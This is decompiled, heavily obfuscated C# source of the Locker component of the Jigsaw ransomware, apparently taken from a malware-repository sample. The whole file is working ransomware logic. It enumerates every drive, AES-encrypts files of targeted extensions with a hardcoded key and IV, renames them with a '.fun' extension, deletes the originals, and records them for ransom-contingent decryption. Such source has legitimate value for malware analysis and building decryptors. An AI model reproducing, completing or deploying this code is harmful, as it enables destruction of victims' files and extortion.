// Decompiled with JetBrains decompiler
// Type: Main.Tools.Locker
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 628485CE-1750-4702-9367-C5FFF8321F79
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Win.Ransomware.Jigsaw-6866216-0-773295583998b76b4e24b562f85fa685577067614133db4a7df3d2a28cb4cc3a.exe

using Main.Properties;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Main.Tools
{
  internal static class Locker
  {
    private static readonly string EncryptedFileListPath = Locker.\u206D⁬⁫‬‌⁯​⁬⁯‭‏‍‏‬⁯‌‪⁬‎‫‌‮‬​‭⁮‍‮​‮‭⁬‍⁫⁯‮⁬⁯⁮⁫‮(Config.WorkFolderPath, "EncryptedFileList.txt");
    private static readonly HashSet<string> EncryptedFiles = new HashSet<string>();
    private const string EncryptionFileExtension = ".fun";
    private const string EncryptionPassword = "OoIsAwwF23cICQoLDA0ODe==";

    internal static void EncryptFileSystem()
    {
      HashSet<string> extensionsToEncrypt = new HashSet<string>(Locker.GetExtensionsToEncrypt());
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      IEnumerator<string> enumerator = ((IEnumerable<DriveInfo>) Locker.\u206E‮‫⁭⁪‬⁫‍‬‎‪‫‭‫⁭‮‌‪⁭⁬‍‌‎‬‌‪‌‍‫⁯‮‏‭⁬‍‫‪‎⁯⁫‮()).Select<DriveInfo, string>((Func<DriveInfo, string>) (drive => Locker.\u003C\u003Ec.\u206B​⁮⁭‪‏‬⁯‪‮⁪‭‌‏‍⁬⁯​⁪​‪⁭⁯​​⁬‫⁬‭⁯‏‬⁮⁯‪⁮⁫⁪‭‮‮((FileSystemInfo) Locker.\u003C\u003Ec.\u202A‮⁭⁮‮‌‏⁬⁫‬‎⁭‭⁫‏‮‎‭‍⁯‮⁮‌‎​⁮⁯‭⁯‮‏‎⁪‌‮⁪⁯⁭​⁭‮(drive)))).GetEnumerator();
      try
      {
        while (Locker.\u206C‫‍⁯‏⁬⁫‬‎‫⁮⁯‫‎‏‍‪‌‎‏‬‎‎‭⁪‮⁮‏‪‏⁫⁮⁯⁪⁯‮⁮‭⁫‬‮((IEnumerator) enumerator))
          Locker.EncryptFiles(enumerator.Current, ".fun", extensionsToEncrypt);
      }
      finally
      {
        if (enumerator != null)
          Locker.\u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮((IDisposable) enumerator);
      }
      if (Locker.\u202A‮⁬‭‫‌‭‌‍‬⁫​⁬‌‪⁬‏⁮‭⁪‮⁭‏‪⁯‎‌‮⁭​⁮⁬‭‍⁯⁭‮⁭‍‍‮(Locker.EncryptedFileListPath))
        return;
      string[] array = Locker.EncryptedFiles.ToArray<string>();
      Locker.\u206F‭⁫⁮⁭‬⁯‬‭⁭⁬‪⁯⁮‭‭‫⁪⁮‫⁯⁬⁬‏‭​‬‪‍‭⁪‭⁯⁪‏⁭‎⁯‎‮‮(Locker.EncryptedFileListPath, array);
    }

    internal static HashSet<string> GetEncryptedFiles()
    {
      HashSet<string> encryptedFiles = new HashSet<string>();
      if (Locker.\u202A‮⁬‭‫‌‭‌‍‬⁫​⁬‌‪⁬‏⁮‭⁪‮⁭‏‪⁯‎‌‮⁭​⁮⁬‭‍⁯⁭‮⁭‍‍‮(Locker.EncryptedFileListPath))
      {
        foreach (string str in Locker.\u202E⁫⁭‮⁯​‮‏⁪‪⁭​‫‎⁬‏⁫‪‎‫‪⁫​‏​⁬‪‏‬‌‭⁪​‪⁭⁭‏⁮⁪⁬‮(Locker.EncryptedFileListPath))
          encryptedFiles.Add(str);
      }
      return encryptedFiles;
    }

    private static string CreateFileSystemSimulation()
    {
      string systemSimulation = Locker.\u206D⁬⁫‬‌⁯​⁬⁯‭‏‍‏‬⁯‌‪⁬‎‫‌‮‬​‭⁮‍‮​‮‭⁬‍⁫⁯‮⁬⁯⁮⁫‮(Config.WorkFolderPath, "FileSystemSimulation");
      if (!Locker.\u206C‮‏‏‬⁯‮⁮⁮‮⁫‭⁫‌⁪⁯‏‍⁪‍‪⁫‎⁫‮‪‌‭⁫⁬‮‭​‭‪‬‬⁭⁯‭‮(systemSimulation))
        Locker.\u206A‫‪‍⁭‬‍⁭⁭⁯‌‪‎‍⁫​⁫‫‫‎⁮⁭⁪​⁮⁯⁯⁫‏⁫‍⁯‮‌‏⁭‪​⁯⁬‮(systemSimulation);
      TextWriter textWriter1 = (TextWriter) Locker.\u202A‭​⁬⁫⁬​‪‎‏⁪⁭⁪​‎‪‪⁪‫⁭‮‏⁫‏‮⁮‪‍‮‎‪‫‍⁭‬‎⁪‮‭‏‮(Locker.\u206D⁬⁫‬‌⁯​⁬⁯‭‏‍‏‬⁯‌‪⁬‎‫‌‮‬​‭⁮‍‮​‮‭⁬‍⁫⁯‮⁬⁯⁮⁫‮(systemSimulation, "TxtTest.txt"), true);
      try
      {
        Locker.\u206F‮​​⁮⁬‬‮​​⁪‏⁬⁬⁭⁮​‎⁮⁪⁫‭⁭‫‏⁫‍‮⁫⁫‮​‭⁮‍⁯⁮‫‫‮‮(textWriter1, "I am a txt test.");
      }
      finally
      {
        if (textWriter1 != null)
          Locker.\u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮((IDisposable) textWriter1);
      }
      TextWriter textWriter2 = (TextWriter) Locker.\u202A‭​⁬⁫⁬​‪‎‏⁪⁭⁪​‎‪‪⁪‫⁭‮‏⁫‏‮⁮‪‍‮‎‪‫‍⁭‬‎⁪‮‭‏‮(Locker.\u206D⁬⁫‬‌⁯​⁬⁯‭‏‍‏‬⁯‌‪⁬‎‫‌‮‬​‭⁮‍‮​‮‭⁬‍⁫⁯‮⁬⁯⁮⁫‮(systemSimulation, "NotTxtTest.nottxt"), true);
      try
      {
        Locker.\u206F‮​​⁮⁬‬‮​​⁪‏⁬⁬⁭⁮​‎⁮⁪⁫‭⁭‫‏⁫‍‮⁫⁫‮​‭⁮‍⁯⁮‫‫‮‮(textWriter2, "I am NOT a txt test.");
      }
      finally
      {
        if (textWriter2 != null)
          Locker.\u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮((IDisposable) textWriter2);
      }
      return systemSimulation;
    }

    private static IEnumerable<string> GetExtensionsToEncrypt()
    {
      HashSet<string> extensionsToEncrypt1 = new HashSet<string>();
      string extensionsToEncrypt2 = Resources.ExtensionsToEncrypt;
      string[] strArray = new string[2]
      {
        Locker.\u206F‮‫‬‮⁭‪‍‮⁫‫‭‪⁮⁭​‪‭‫⁯⁮‮‍⁪‌​‍‫⁪⁬‭‪‌⁪‏⁬‬‍⁭‮(),
        " "
      };
      foreach (string str in ((IEnumerable<string>) Locker.\u202D‪‭⁫⁯⁯‎⁭‌‭​⁪⁮‬⁭‬⁯⁭⁮⁭‭‎⁫⁯‪⁯⁯‏‮‬‫‏‎‭⁫‬‎​‮‮‮(extensionsToEncrypt2, strArray, StringSplitOptions.RemoveEmptyEntries)).ToList<string>())
        extensionsToEncrypt1.Add(Locker.\u202B⁪‏‫⁬‌⁯⁯‌‬⁪⁮‌‫‭‌‍​‪⁭‭‮⁬⁭‪​⁮‏‭‎‌⁮⁪‫⁫‪⁮‬‬‭‮(str));
      extensionsToEncrypt1.Remove(".fun");
      return (IEnumerable<string>) extensionsToEncrypt1;
    }

    private static IEnumerable<string> GetFiles(string path)
    {
      Queue<string> queue = new Queue<string>();
      queue.Enqueue(path);
      while (queue.Count > 0)
      {
        path = queue.Dequeue();
        try
        {
          // ISSUE: reference to a compiler-generated method
          foreach (string str in Locker.\u003CGetFiles\u003Ed__8.\u200F⁭‬‏⁬‫⁪‏‫‭‌‮‬‬⁭⁯⁮⁫‭‏⁯‭⁬​‪​‏‏‏‫‭⁬​‭⁬‎‪‬‮‬‮(path))
            queue.Enqueue(str);
        }
        catch (Exception ex)
        {
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          Locker.\u003CGetFiles\u003Ed__8.\u202C‎‌⁪⁮⁪‌‏⁪‏⁯‎‌‏​⁯‏‭⁮‫⁮⁭​⁬‌‭⁮‎‮⁬⁭‏‏‮⁯‭⁫‭‮⁫‮(Locker.\u003CGetFiles\u003Ed__8.\u200E⁯‭‌‫‌‍‮‍‏⁫​‍‌‎‍⁭⁫‬‭⁯‫⁭‎‌​‮⁭‭⁭‌‌‌‍⁫​⁬‍⁭‍‮(), (object) ex);
        }
        string[] strArray1 = (string[]) null;
        try
        {
          // ISSUE: reference to a compiler-generated method
          strArray1 = Locker.\u003CGetFiles\u003Ed__8.\u200B⁬‮‫‎​‌⁬‪⁪‬‬‎⁫‪‫⁯‬⁯⁭‭⁭⁫⁮‍⁪‏⁬⁭⁭‪⁭⁪‫‍⁬⁯⁯‎⁯‮(path);
        }
        catch (Exception ex)
        {
          // ISSUE: reference to a compiler-generated method
          // ISSUE: reference to a compiler-generated method
          Locker.\u003CGetFiles\u003Ed__8.\u202C‎‌⁪⁮⁪‌‏⁪‏⁯‎‌‏​⁯‏‭⁮‫⁮⁭​⁬‌‭⁮‎‮⁬⁭‏‏‮⁯‭⁫‭‮⁫‮(Locker.\u003CGetFiles\u003Ed__8.\u200E⁯‭‌‫‌‍‮‍‏⁫​‍‌‎‍⁭⁫‬‭⁯‫⁭‎‌​‮⁭‭⁭‌‌‌‍⁫​⁬‍⁭‍‮(), (object) ex);
        }
        if (strArray1 != null)
        {
          string[] strArray = strArray1;
          for (int index = 0; index < strArray.Length; ++index)
            yield return strArray[index];
          strArray = (string[]) null;
        }
      }
    }

    private static void EncryptFiles(
      string dirPath,
      string encryptionExtension,
      HashSet<string> extensionsToEncrypt)
    {
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      // ISSUE: reference to a compiler-generated method
      IEnumerator<string> enumerator = Locker.GetFiles(dirPath).SelectMany((Func<string, IEnumerable<string>>) (file => (IEnumerable<string>) extensionsToEncrypt), (file, ext) => new
      {
        file = file,
        ext = ext
      }).Where(_param1 => Locker.\u003C\u003Ec.\u200B‬‮‎⁭‪⁫‮‎⁬⁫​⁪⁪‎‎⁯⁮‫‭‮‫‎⁭‎⁪‏‏⁬⁫‬‍‏⁭​⁮‏‎⁮‭‮(_param1.file, _param1.ext)).Select(_param1 => _param1.file).Select(file => new
      {
        file = file,
        fi = Locker.\u003C\u003Ec.\u200E‫⁪​⁬‏⁫‌⁪⁫‌‏⁯⁬‌​‏‪⁮⁯‬‏‌⁭⁬⁫⁬⁫‪‏‫‫⁬⁯⁮⁫​​‫⁪‮(file)
      }).Where(t => Locker.\u003C\u003Ec.\u202A‭‫⁫‏‫⁬​‪‬⁮‌‍‭‍‫‮⁫‎‌⁪⁮⁯⁯‍⁭⁮‏‍⁯‏⁮‎‪‮⁬‪⁪‪⁭‮(t.fi) < 10000000L).Select(t => t.file).GetEnumerator();
      try
      {
        while (Locker.\u206C‫‍⁯‏⁬⁫‬‎‫⁮⁯‫‎‏‍‪‌‎‏‬‎‎‭⁪‮⁮‏‪‏⁫⁮⁯⁪⁯‮⁮‭⁫‬‮((IEnumerator) enumerator))
        {
          string current = enumerator.Current;
          try
          {
            if (Locker.EncryptFile(current, encryptionExtension))
              Locker.EncryptedFiles.Add(current);
          }
          catch
          {
          }
        }
      }
      finally
      {
        if (enumerator != null)
          Locker.\u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮((IDisposable) enumerator);
      }
    }

    internal static void DecryptFiles(string encryptionExtension)
    {
      foreach (string encryptedFile in Locker.GetEncryptedFiles())
      {
        try
        {
          string path = Locker.\u206B⁮‭‭‬‎‫⁮‬‮⁬⁫⁭⁪‌⁪‫‎⁬‪⁬⁮‪‍‎⁫‮‬⁮​⁯⁭⁬⁯‮⁯⁭​‪‏‮(encryptedFile, encryptionExtension);
          Locker.DecryptFile(path, encryptionExtension);
          Locker.\u200B⁭‎‭‮⁪⁬⁪‮⁮‍‪‮‪‫⁫‪‫‪⁮‎‭⁯‏​⁪‏⁪‭⁪‏‎​‏‫‪​‏⁬⁬‮(path);
        }
        catch
        {
        }
      }
      Locker.\u200B⁭‎‭‮⁪⁬⁪‮⁮‍‪‮‪‫⁫‪‫‪⁮‎‭⁯‏​⁪‏⁪‭⁪‏‎​‏‫‪​‏⁬⁬‮(Locker.EncryptedFileListPath);
    }

    private static bool EncryptFile(string path, string encryptionExtension)
    {
      try
      {
        if (Config.StartMode != Config.StartModeType.Debug && (Locker.\u200C⁭⁫⁮⁫‮‪‍‏‍⁪‍‭⁪‌⁮‮‎⁮‎‏‭​‮⁮⁪‍‏‏⁮‎⁯⁯⁪​‪⁯‫‎⁭‮(path, Config.WorkFolderPath, StringComparison.InvariantCulture) || Locker.\u200C⁭⁫⁮⁫‮‪‍‏‍⁪‍‭⁪‌⁮‮‎⁮‎‏‭​‮⁮⁪‍‏‏⁮‎⁯⁯⁪​‪⁯‫‎⁭‮(path, "C:\\Windows", StringComparison.InvariantCultureIgnoreCase)))
          return false;
        AesCryptoServiceProvider alg = Locker.\u200F‏‬‪⁯‍⁬‌‏‪⁪‭‫‭‌‍‫⁫‫‌​‪​⁬‎‬‍‭‌⁫‏‪‌‍⁬‬⁯⁮‌⁬‮();
        try
        {
          Locker.\u206D‌‬‎‍⁮‍‪‏⁬‎⁪‎‪⁪⁫‭⁯​​⁯‎‬‫‌‎‬‌⁬⁯‪‌‭‭‮‬‪‬⁮⁯‮((SymmetricAlgorithm) alg, Locker.\u206B⁫‍⁮⁪‌‭‭⁮‮‮​‬‏⁪‪‪‌‭⁯‫‬‮‏​‎‪‍​⁭‍‮‪⁯⁯‌⁮‍⁯‮‮("OoIsAwwF23cICQoLDA0ODe=="));
          AesCryptoServiceProvider cryptoServiceProvider = alg;
          byte[] numArray = new byte[16];
          // ISSUE: field reference
          Locker.\u202A​⁫‫⁯⁭⁬‏‎‬⁬‏‭⁯‎‭‬⁯⁯⁫‬⁮‮‭⁬‏⁮​‬⁬‫⁯‬‍‫‫‪⁯‫‬‮((Array) numArray, __fieldref (\u003CPrivateImplementationDetails\u003E.FBD2112E56A53790B3D53B084795822F604F11FC));
          Locker.\u202A‭‪⁬‏⁭⁬​⁫⁫‌‍‭‎‍⁪‎‍‏‮‬⁯‎⁭‫‮⁭‏⁮‮‪⁬‌⁭⁪⁫⁯​⁪‮((SymmetricAlgorithm) cryptoServiceProvider, numArray);
          Locker.EncryptFile((SymmetricAlgorithm) alg, path, Locker.\u206B⁮‭‭‬‎‫⁮‬‮⁬⁫⁭⁪‌⁪‫‎⁬‪⁬⁮‪‍‎⁫‮‬⁮​⁯⁭⁬⁯‮⁯⁭​‪‏‮(path, encryptionExtension));
        }
        finally
        {
          if (alg != null)
            Locker.\u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮((IDisposable) alg);
        }
      }
      catch
      {
        return false;
      }
      try
      {
        Locker.\u200B⁭‎‭‮⁪⁬⁪‮⁮‍‪‮‪‫⁫‪‫‪⁮‎‭⁯‏​⁪‏⁪‭⁪‏‎​‏‫‪​‏⁬⁬‮(path);
      }
      catch (Exception ex)
      {
        return false;
      }
      return true;
    }

    private static void DecryptFile(string path, string encryptionExtension)
    {
      try
      {
        if (!Locker.\u206E‬⁭⁬‍‌‌⁭‮‫‫‮⁪⁫⁬‬⁫⁮‏‌‪‎‍⁬‮​‬‏⁭‫‮‎‌⁫⁮​⁬⁮⁬⁫‮(path, encryptionExtension))
          return;
        string outputFile = Locker.\u202E⁬‎‎​‏‮‫⁯‭‪⁯⁬‌‎‏‫⁭‍‍‭‍⁬‭‮⁬⁯‭⁮⁪⁪⁯‏⁬⁪‮⁯⁫⁯‪‮(path, Locker.\u206D⁫⁪‎‭⁮‫‮⁬‫‮‏‍⁫‪⁮‪‭‬​‎‎‭‫‪​‫​⁬⁪‬⁮‮​⁫⁬‍‬⁭‪‮(path) - 4);
        AesCryptoServiceProvider alg = Locker.\u200F‏‬‪⁯‍⁬‌‏‪⁪‭‫‭‌‍‫⁫‫‌​‪​⁬‎‬‍‭‌⁫‏‪‌‍⁬‬⁯⁮‌⁬‮();
        try
        {
          Locker.\u206D‌‬‎‍⁮‍‪‏⁬‎⁪‎‪⁪⁫‭⁯​​⁯‎‬‫‌‎‬‌⁬⁯‪‌‭‭‮‬‪‬⁮⁯‮((SymmetricAlgorithm) alg, Locker.\u206B⁫‍⁮⁪‌‭‭⁮‮‮​‬‏⁪‪‪‌‭⁯‫‬‮‏​‎‪‍​⁭‍‮‪⁯⁯‌⁮‍⁯‮‮("OoIsAwwF23cICQoLDA0ODe=="));
          AesCryptoServiceProvider cryptoServiceProvider = alg;
          byte[] numArray = new byte[16];
          // ISSUE: field reference
          Locker.\u202A​⁫‫⁯⁭⁬‏‎‬⁬‏‭⁯‎‭‬⁯⁯⁫‬⁮‮‭⁬‏⁮​‬⁬‫⁯‬‍‫‫‪⁯‫‬‮((Array) numArray, __fieldref (\u003CPrivateImplementationDetails\u003E.FBD2112E56A53790B3D53B084795822F604F11FC));
          Locker.\u202A‭‪⁬‏⁭⁬​⁫⁫‌‍‭‎‍⁪‎‍‏‮‬⁯‎⁭‫‮⁭‏⁮‮‪⁬‌⁭⁪⁫⁯​⁪‮((SymmetricAlgorithm) cryptoServiceProvider, numArray);
          Locker.DecryptFile((SymmetricAlgorithm) alg, path, outputFile);
        }
        finally
        {
          if (alg != null)
            Locker.\u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮((IDisposable) alg);
        }
      }
      catch
      {
        return;
      }
      try
      {
        Locker.\u200B⁭‎‭‮⁪⁬⁪‮⁮‍‪‮‪‫⁫‪‫‪⁮‎‭⁯‏​⁪‏⁪‭⁪‏‎​‏‫‪​‏⁬⁬‮(path);
      }
      catch (Exception ex)
      {
      }
    }

    private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
      byte[] numArray = new byte[65536];
      FileStream fileStream1 = Locker.\u206C⁮‫⁪‌​⁪⁫⁫‌‫​⁪‮‭‬‍‮⁮⁭‍‫‮⁫‌⁫⁮⁭⁭‪‍‌⁫‌‭‬⁮⁪⁭⁪‮(inputFile, FileMode.Open);
      try
      {
        FileStream fileStream2 = Locker.\u206C⁮‫⁪‌​⁪⁫⁫‌‫​⁪‮‭‬‍‮⁮⁭‍‫‮⁫‌⁫⁮⁭⁭‪‍‌⁫‌‭‬⁮⁪⁭⁪‮(outputFile, FileMode.Create);
        try
        {
          CryptoStream cryptoStream = Locker.\u202B‌​‏⁯⁪‎‌‫‭‪‭‪‬⁬⁯‎⁬⁫⁫‫⁮‎‎⁫‭‬⁫‬‏‌‮‍‫⁬⁫‪⁪‍‬‮((Stream) fileStream2, Locker.\u206B⁯⁬​⁫‮⁭‪⁬⁭⁭⁪‮‎‮‫⁫⁭‬‬‭​⁪⁪‫‭​‪‬‭‏⁬⁭‪‭‎‬‮‭‍‮(alg), CryptoStreamMode.Write);
          try
          {
            int num;
            do
            {
              num = Locker.\u206E‏⁫‬‮⁮‏‍⁪⁪⁫⁯​‌⁮‏⁮⁪‌‍⁯⁫‫‪​‭⁯‬‎‬‍⁬⁪‬⁯‪‍‎‬‬‮((Stream) fileStream1, numArray, 0, numArray.Length);
              if (num != 0)
                Locker.\u200D⁭⁯‬‭⁮⁬‫‎‬⁬‭⁬⁫⁬⁪‮‪‏​‏​‮‪​⁯‮‫‭‫⁫‭‎​⁭⁭‭⁮⁮⁪‮((Stream) cryptoStream, numArray, 0, num);
            }
            while (num != 0);
          }
          finally
          {
            if (cryptoStream != null)
              Locker.\u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮((IDisposable) cryptoStream);
          }
        }
        finally
        {
          if (fileStream2 != null)
            Locker.\u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮((IDisposable) fileStream2);
        }
      }
      finally
      {
        if (fileStream1 != null)
          Locker.\u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮((IDisposable) fileStream1);
      }
    }

    private static void DecryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
      byte[] numArray = new byte[65536];
      FileStream fileStream1 = Locker.\u206C⁮‫⁪‌​⁪⁫⁫‌‫​⁪‮‭‬‍‮⁮⁭‍‫‮⁫‌⁫⁮⁭⁭‪‍‌⁫‌‭‬⁮⁪⁭⁪‮(inputFile, FileMode.Open);
      try
      {
        FileStream fileStream2 = Locker.\u206C⁮‫⁪‌​⁪⁫⁫‌‫​⁪‮‭‬‍‮⁮⁭‍‫‮⁫‌⁫⁮⁭⁭‪‍‌⁫‌‭‬⁮⁪⁭⁪‮(outputFile, FileMode.Create);
        try
        {
          CryptoStream cryptoStream = Locker.\u202B‌​‏⁯⁪‎‌‫‭‪‭‪‬⁬⁯‎⁬⁫⁫‫⁮‎‎⁫‭‬⁫‬‏‌‮‍‫⁬⁫‪⁪‍‬‮((Stream) fileStream2, Locker.\u206E‮‌‍‎‫​‮‍‫‎‫‮⁮‏‎⁪⁭‏‭‎⁬‍⁭⁪‬⁬​⁯‪⁯‌‬‌⁮‌‎‏⁭‍‮(alg), CryptoStreamMode.Write);
          try
          {
            int num;
            do
            {
              num = Locker.\u206E‏⁫‬‮⁮‏‍⁪⁪⁫⁯​‌⁮‏⁮⁪‌‍⁯⁫‫‪​‭⁯‬‎‬‍⁬⁪‬⁯‪‍‎‬‬‮((Stream) fileStream1, numArray, 0, numArray.Length);
              if (num != 0)
                Locker.\u200D⁭⁯‬‭⁮⁬‫‎‬⁬‭⁬⁫⁬⁪‮‪‏​‏​‮‪​⁯‮‫‭‫⁫‭‎​⁭⁭‭⁮⁮⁪‮((Stream) cryptoStream, numArray, 0, num);
            }
            while (num != 0);
          }
          finally
          {
            if (cryptoStream != null)
              Locker.\u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮((IDisposable) cryptoStream);
          }
        }
        finally
        {
          if (fileStream2 != null)
            Locker.\u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮((IDisposable) fileStream2);
        }
      }
      finally
      {
        if (fileStream1 != null)
          Locker.\u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮((IDisposable) fileStream1);
      }
    }

    static DriveInfo[] \u206E‮‫⁭⁪‬⁫‍‬‎‪‫‭‫⁭‮‌‪⁭⁬‍‌‎‬‌‪‌‍‫⁯‮‏‭⁬‍‫‪‎⁯⁫‮() => DriveInfo.GetDrives();

    static bool \u206C‫‍⁯‏⁬⁫‬‎‫⁮⁯‫‎‏‍‪‌‎‏‬‎‎‭⁪‮⁮‏‪‏⁫⁮⁯⁪⁯‮⁮‭⁫‬‮([In] IEnumerator obj0) => obj0.MoveNext();

    static void \u206F‍‌⁯⁫⁭‮⁬‬‬‪‬​‍⁫⁯‎‫⁮‌⁮⁫‍​‌⁮⁮‏⁫‎‮‮‏‏‎‬‏‍⁪‌‮([In] IDisposable obj0) => obj0.Dispose();

    static bool \u202A‮⁬‭‫‌‭‌‍‬⁫​⁬‌‪⁬‏⁮‭⁪‮⁭‏‪⁯‎‌‮⁭​⁮⁬‭‍⁯⁭‮⁭‍‍‮([In] string obj0) => File.Exists(obj0);

    static void \u206F‭⁫⁮⁭‬⁯‬‭⁭⁬‪⁯⁮‭‭‫⁪⁮‫⁯⁬⁬‏‭​‬‪‍‭⁪‭⁯⁪‏⁭‎⁯‎‮‮([In] string obj0, [In] string[] obj1) => File.WriteAllLines(obj0, obj1);

    static string[] \u202E⁫⁭‮⁯​‮‏⁪‪⁭​‫‎⁬‏⁫‪‎‫‪⁫​‏​⁬‪‏‬‌‭⁪​‪⁭⁭‏⁮⁪⁬‮([In] string obj0) => File.ReadAllLines(obj0);

    static string \u206D⁬⁫‬‌⁯​⁬⁯‭‏‍‏‬⁯‌‪⁬‎‫‌‮‬​‭⁮‍‮​‮‭⁬‍⁫⁯‮⁬⁯⁮⁫‮([In] string obj0, [In] string obj1) => Path.Combine(obj0, obj1);

    static bool \u206C‮‏‏‬⁯‮⁮⁮‮⁫‭⁫‌⁪⁯‏‍⁪‍‪⁫‎⁫‮‪‌‭⁫⁬‮‭​‭‪‬‬⁭⁯‭‮([In] string obj0) => Directory.Exists(obj0);

    static DirectoryInfo \u206A‫‪‍⁭‬‍⁭⁭⁯‌‪‎‍⁫​⁫‫‫‎⁮⁭⁪​⁮⁯⁯⁫‏⁫‍⁯‮‌‏⁭‪​⁯⁬‮([In] string obj0) => Directory.CreateDirectory(obj0);

    static StreamWriter \u202A‭​⁬⁫⁬​‪‎‏⁪⁭⁪​‎‪‪⁪‫⁭‮‏⁫‏‮⁮‪‍‮‎‪‫‍⁭‬‎⁪‮‭‏‮(
      [In] string obj0,
      [In] bool obj1)
    {
      return new StreamWriter(obj0, obj1);
    }

    static void \u206F‮​​⁮⁬‬‮​​⁪‏⁬⁬⁭⁮​‎⁮⁪⁫‭⁭‫‏⁫‍‮⁫⁫‮​‭⁮‍⁯⁮‫‫‮‮([In] TextWriter obj0, [In] string obj1) => obj0.WriteLine(obj1);

    static string \u206F‮‫‬‮⁭‪‍‮⁫‫‭‪⁮⁭​‪‭‫⁯⁮‮‍⁪‌​‍‫⁪⁬‭‪‌⁪‏⁬‬‍⁭‮() => Environment.NewLine;

    static string[] \u202D‪‭⁫⁯⁯‎⁭‌‭​⁪⁮‬⁭‬⁯⁭⁮⁭‭‎⁫⁯‪⁯⁯‏‮‬‫‏‎‭⁫‬‎​‮‮‮(
      [In] string obj0,
      [In] string[] obj1,
      [In] StringSplitOptions obj2)
    {
      return obj0.Split(obj1, obj2);
    }

    static string \u202B⁪‏‫⁬‌⁯⁯‌‬⁪⁮‌‫‭‌‍​‪⁭‭‮⁬⁭‪​⁮‏‭‎‌⁮⁪‫⁫‪⁮‬‬‭‮([In] string obj0) => obj0.Trim();

    static string \u206B⁮‭‭‬‎‫⁮‬‮⁬⁫⁭⁪‌⁪‫‎⁬‪⁬⁮‪‍‎⁫‮‬⁮​⁯⁭⁬⁯‮⁯⁭​‪‏‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static void \u200B⁭‎‭‮⁪⁬⁪‮⁮‍‪‮‪‫⁫‪‫‪⁮‎‭⁯‏​⁪‏⁪‭⁪‏‎​‏‫‪​‏⁬⁬‮([In] string obj0) => File.Delete(obj0);

    static bool \u200C⁭⁫⁮⁫‮‪‍‏‍⁪‍‭⁪‌⁮‮‎⁮‎‏‭​‮⁮⁪‍‏‏⁮‎⁯⁯⁪​‪⁯‫‎⁭‮(
      [In] string obj0,
      [In] string obj1,
      [In] StringComparison obj2)
    {
      return obj0.StartsWith(obj1, obj2);
    }

    static AesCryptoServiceProvider \u200F‏‬‪⁯‍⁬‌‏‪⁪‭‫‭‌‍‫⁫‫‌​‪​⁬‎‬‍‭‌⁫‏‪‌‍⁬‬⁯⁮‌⁬‮() => new AesCryptoServiceProvider();

    static byte[] \u206B⁫‍⁮⁪‌‭‭⁮‮‮​‬‏⁪‪‪‌‭⁯‫‬‮‏​‎‪‍​⁭‍‮‪⁯⁯‌⁮‍⁯‮‮([In] string obj0) => Convert.FromBase64String(obj0);

    static void \u206D‌‬‎‍⁮‍‪‏⁬‎⁪‎‪⁪⁫‭⁯​​⁯‎‬‫‌‎‬‌⁬⁯‪‌‭‭‮‬‪‬⁮⁯‮([In] SymmetricAlgorithm obj0, [In] byte[] obj1) => obj0.Key = obj1;

    static void \u202A​⁫‫⁯⁭⁬‏‎‬⁬‏‭⁯‎‭‬⁯⁯⁫‬⁮‮‭⁬‏⁮​‬⁬‫⁯‬‍‫‫‪⁯‫‬‮([In] Array obj0, [In] RuntimeFieldHandle obj1) => RuntimeHelpers.InitializeArray(obj0, obj1);

    static void \u202A‭‪⁬‏⁭⁬​⁫⁫‌‍‭‎‍⁪‎‍‏‮‬⁯‎⁭‫‮⁭‏⁮‮‪⁬‌⁭⁪⁫⁯​⁪‮([In] SymmetricAlgorithm obj0, [In] byte[] obj1) => obj0.IV = obj1;

